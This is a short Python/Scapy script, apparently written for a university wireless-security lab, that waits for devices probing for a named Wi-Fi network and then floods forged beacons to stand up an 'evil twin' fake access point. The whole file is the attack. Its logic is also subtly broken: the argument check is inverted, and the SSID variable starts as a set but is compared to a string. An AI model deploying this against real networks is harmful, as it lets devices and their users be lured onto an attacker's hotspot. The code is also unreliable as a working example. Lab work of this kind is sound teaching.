#!/usr/bin/env python
#-*- coding: utf-8 -*-
#-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
#  Authors : yimnaing Kamdem && Siu Aurelien
#  Description: Nous allons nous intéresser dans cet exercice à la création 
#               d'un evil twin pour viser une cible que l'on découvre 
#               dynamiquementutilisant des probes.
# 
#  Objectif: Développer un script en Python/Scapy capable de detecter 
#            une STA cherchant un SSID particulier
#               - proposer un evil twin si le SSID est trouvé (i.e. McDonalds, Starbucks, etc.).
#            Pour la détection du SSID, vous devez utiliser Scapy. 
#            Pour proposer un evil twin, vous pouvez récupérer votre code du labo 1
#            ou vous servir d'un outil existant.
#
#-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

import sys
from scapy.all import *

interface = "wlan0mon"

# Nom du point d'accès passé en paramètre au script
ap_SSID = set()

# fonction appelée pour chaque paquet sniffé
def packetHandler(pkt):
    # Test si c'est bien un packet ProbeRequest
    if pkt.haslayer(Dot11ProbeReq):
        # Test si le SSID correspond à celui qui a été fourni
        if len(pkt.info) > 0  and pkt.info.decode() == ap_SSID:
            # Création du faux point d'accès
            fakeApCreator()
                
 
# Fonction permettant la création d'un faux point d'accès
def fakeApCreator():
    # adresse mac aléatoire
    mac_AP = str(RandMAC())
    fake_AP_packet = RadioTap() / Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF",addr2=mac_AP, addr3=mac_AP) / Dot11Beacon() / Dot11Elt(ID= "SSID", info=ap_SSID)

    while True:
        sendp(fake_AP_packet, iface=interface)

if (len(sys.argv) != 2):

    ap_SSID = sys.argv[1]
    # On sniffe en passant en fonction de callback la fonction sniffing
    a = sniff(iface=interface, prn=packetHandler)

